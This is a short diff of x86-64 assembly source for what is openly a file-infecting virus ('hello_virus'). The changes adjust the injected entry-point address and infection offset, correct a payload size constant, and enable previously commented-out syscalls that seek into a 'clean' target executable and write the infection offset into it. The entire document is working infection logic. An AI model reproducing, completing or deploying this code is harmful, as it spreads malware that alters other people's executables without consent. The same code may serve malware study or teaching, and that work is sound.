@@ -18,8 +18,8 @@ fileName db "hello", 0
 fileName_len equ $-fileName
 injName db "hello_virus", 0
 injName_len equ $-injName
-injectEntry dd 0x401176
-infectedOffset dd 0x11c9
+injectEntry dd 0x40117a
+infectedOffset dd 0x1156
 
 _start:
 
@@ -67,7 +67,7 @@ _start:
 	mov	rdi,	r12
 	mov	rsi,	r13
 	mov	rdx,	0x0
-	mov	r10,	0xE3 	; size = 300 in decimal
+	mov	r10,	0x12C 	; size = 300 in decimal
 	syscall
 
        ; lseek offset to entry point address
@@ -85,18 +85,18 @@ _start:
         syscall
 
 	; FOR FIRST INFECTION change lseek offset in "clean" file to be correct
-;	mov	rax,	SYS_LSEEK
-;	mov	rdi,	r12
-;	mov	rsi,	0x11c9
-;	mov	rdx,	0
-;	syscall
-;
-;	mov 	rax,	SYS_WRITE
-;	mov	rdi,	r12
-;	mov	rsi,	infectedOffset
-;	mov	rdx,	4
-;	syscall
-;
+	mov	rax,	SYS_LSEEK
+	mov	rdi,	r12
+	mov	rsi,	0x11cd
+	mov	rdx,	0
+	syscall
+
+	mov 	rax,	SYS_WRITE
+	mov	rdi,	r12
+	mov	rsi,	infectedOffset
+	mov	rdx,	4
+	syscall
+
  
         ; CLOSE ALL FILES
         mov	rax,	SYS_CLOSE
